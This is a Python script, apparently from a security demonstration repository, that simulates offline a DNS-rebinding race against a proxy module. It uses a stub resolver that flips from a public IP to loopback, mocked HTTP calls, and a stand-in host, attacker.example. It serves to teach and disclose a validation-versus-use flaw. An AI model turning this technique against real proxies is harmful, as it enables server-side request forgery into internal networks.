"""Offline demonstration of the DNS-rebinding race in proxy.py.

No network. No real DNS. A stub resolver returns a public IP on the first call
(satisfying the private-network check) and 127.0.0.1 on the second call
(when httpx tries to actually connect).

Run:
    uv run python attacks/03-trust-boundary/dns_rebind_demo.py
"""

from __future__ import annotations

import asyncio
import sys
from pathlib import Path
from unittest.mock import AsyncMock, patch

HERE = Path(__file__).parent
sys.path.insert(0, str(HERE))

from proxy import proxy_request  # noqa: E402


class FlippingResolver:
    """First call: public. Subsequent calls: loopback."""

    def __init__(self) -> None:
        self.calls = 0

    def __call__(self, _hostname: str) -> str:
        self.calls += 1
        return "93.184.216.34" if self.calls == 1 else "127.0.0.1"


class FakeRequest:
    def __init__(self, target: str) -> None:
        self.headers = {"X-Target-URL": target}


async def _run() -> None:
    resolver = FlippingResolver()

    async def fake_get(self, url, *args, **kwargs):  # type: ignore[no-untyped-def]
        # In a real exploit, httpx's own DNS lookup would hit the attacker's
        # flipped record. We simulate that by resolving via our stub here.
        resolved = resolver(url)
        print(f"  httpx resolved {url} -> {resolved} (call #{resolver.calls})")
        if resolved.startswith(("10.", "127.", "169.254", "172.16")):
            print("  *** would now be reading from an internal address ***")
        response = AsyncMock()
        response.content = b"<internal data>"
        response.status_code = 200
        return response

    with patch("proxy.socket.gethostbyname", side_effect=resolver):
        with patch("httpx.AsyncClient.get", new=fake_get):
            try:
                resp = await proxy_request(FakeRequest("http://attacker.example/"))  # type: ignore[arg-type]
                print(f"  Response from proxy_request: status={resp.status_code}")
            except Exception as exc:  # noqa: BLE001
                print(f"  proxy_request raised: {exc}")

    print(f"\n  Resolver was called {resolver.calls} times.")
    print("  Static review can't see this. The test suite doesn't exercise it.")
    print("  The vulnerability exists in the gap between validation and use.")


def main() -> int:
    print("\n" + "=" * 76)
    print("  03 — DNS-rebinding race against proxy.py (offline)")
    print("=" * 76 + "\n")
    asyncio.run(_run())
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
